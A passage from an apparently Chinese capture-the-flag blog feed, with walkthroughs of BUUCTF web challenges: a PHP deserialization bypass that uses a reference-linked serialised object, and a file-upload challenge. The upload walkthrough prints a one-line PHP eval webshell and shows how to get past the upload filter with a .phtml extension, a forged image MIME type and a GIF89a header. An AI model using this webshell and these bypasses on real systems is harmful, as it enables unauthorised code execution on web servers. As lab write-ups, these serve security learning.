title="2.条件判断"></a>2.条件判断</h3><ul><li><code>$_GET[&#39;pleaseget&#39;]</code> 必须等于 <code>&#39;1&#39;</code>，且 <code>$_POST[&#39;pleasepost&#39;]</code> 必须等于 <code>&#39;2&#39;</code></li><li>然后，存在一个双重的 <code>md5()</code> 碰撞检查：要求 <code>md5($_POST[&#39;md51&#39;]) == md5($_POST[&#39;md52&#39;])</code> 且 <code>$_POST[&#39;md51&#39;] != $_POST[&#39;md52&#39;]</code>。</li></ul><h3 id="3-反序列化操作"><a href="#3-反序列化操作" class="headerlink" title="3.反序列化操作"></a>3.反序列化操作</h3><ul><li>当上述条件满足后，代码执行 <code>unserialize($_POST[&#39;obj&#39;]);</code>，反序列化用户提供的对象数据。这一操作可能被利用来执行任意代码或攻击者控制的操作。</li></ul><h2 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h2><p>构建一个url，包括1个get请求，4个post请求，满足上述条件，即可获得flag信息。<br>1.发送一个get请求。<br><img src="/../images/Pasted%20image%2020240905150859.png">2. 为了触发<code>BUU</code> 类中的 <code>__destruct()</code> 方法，需要构造一个序列化的对象。<br>（构造的 <code>BUU</code> 对象，在反序列化后没有进一步引用，因此 PHP 将在反序列化后立即销毁该对象，自动触发其 <code>__destruct()</code> 方法。）<br>要使$this-&gt;correct &#x3D;&#x3D;&#x3D; $this-&gt;input，只需将this-&gt;input指向this-&gt;correct的地址：</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BUU</span> </span>&#123;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$correct</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$input</span> = <span class="hljs-string">&quot;&quot;</span>;<br>   &#125;<br><br><span class="hljs-variable">$obj</span> =<span class="hljs-keyword">new</span> BUU;<br><span class="hljs-variable">$obj</span>-&gt;input = &amp;<span class="hljs-variable">$obj</span>-&gt;correct;                <br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$obj</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输出如下：<br><code>O:3:&quot;BUU&quot;:2:&#123;s:7:&quot;correct&quot;;s:0:&quot;&quot;;s:5:&quot;input&quot;;R:2;&#125;</code><br>3. 使用hackbar，点击execute,发送post请求：<br><img src="/../images/Pasted%20image%2020240905170501.png"></p><h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>上传一句话木马。<br><code> &lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code><br>burpsuite抓包，发送到repeater。<br><img src="/../images/Pasted%20image%2020240911172956.png"><br>修改属性以绕过检测。<br>将文件名修改为web.phtml，绕过常规php文件后缀检测<br>将文件类型修改为：image&#x2F;jpeg<br><strong>注意：phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</strong>。<br>因为一句话木马存在?&gt;,所以被过滤了，所以需要将一句话木马进行修改，并添加图片头GIF89a。<br><img src="/../images/Pasted%20image%2020240911173409.png"><br>上传成功。<br><img src="/../images/Pasted%20image%2020240911173559.png"><br>反复试验，发现路径为upload。<br><a href="http://3e6bfe9d-2884-4976-b474-80c2ba542f20.node5.buuoj.cn:81/upload/web.phtml">http://3e6bfe9d-2884-4976-b474-80c2ba542f20.node5.buuoj.cn:81/upload/web.phtml</a><br>连接成功，根目录找到flag。<br><img src="/../images/Pasted%20image%2020240911174427.png"></p><h1 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h1><p>文件后缀过滤的很全，常见的绕过方法<code>php3/5/7/</code>、<code>phtml</code>都不行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUU-LFI-COURSE-1&quot;&gt;&lt;a href=&quot;#BUU-LFI-COURSE-1&quot; class=&quot;headerlink&quot; title=&quot;BUU LFI COURSE 1&quot;&gt;&lt;/a&gt;BUU LFI COURSE 1&lt;/h1&gt;&lt;figure class=&quot;hi</summary>
      
    
    
    
    
  </entry>
  
</feed>
